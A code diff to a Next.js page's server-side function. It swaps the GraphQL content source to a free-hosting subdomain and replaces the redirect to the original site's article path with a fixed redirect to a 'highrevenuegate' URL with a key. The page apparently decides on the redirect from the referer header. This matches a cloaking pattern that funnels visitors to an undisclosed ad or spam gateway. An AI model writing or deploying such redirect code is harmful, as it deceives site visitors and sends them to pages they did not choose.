@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = "https://hausasocial.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/x32fvce1t?key=6421b5e686101651497e3b9ec3f8c3e4/` 
 				}`,
 			},
 		};
